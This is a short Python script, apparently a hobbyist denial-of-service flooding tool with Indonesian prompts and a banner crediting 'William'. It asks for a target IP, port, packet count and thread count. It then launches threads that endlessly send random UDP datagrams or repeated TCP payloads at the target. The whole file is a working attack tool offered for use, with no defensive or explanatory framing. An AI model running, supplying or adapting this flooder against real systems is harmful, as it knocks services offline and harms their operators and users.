#!/usr/bin/env python3
#Kagak Usah Rename BY By Tai Anjing 
#Ddos by William
import random
import socket
import threading
import os

os.system("clear")
print("DDoS Tools By William#ffb71c1c [Beta Version]")
print("Bismilah Tembus")
ip = str(input(" Ip: "))
port = int(input(" Port: "))
choice = str(input(" Terobos?(gas/gak): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | Send!!!|")
    except:
      print("[!] | Send!!! |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" William Di Sini!!!")
    except:
      s.close()
      print("[*] Down")

for y in range(threads):
  if choice == 'gas':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()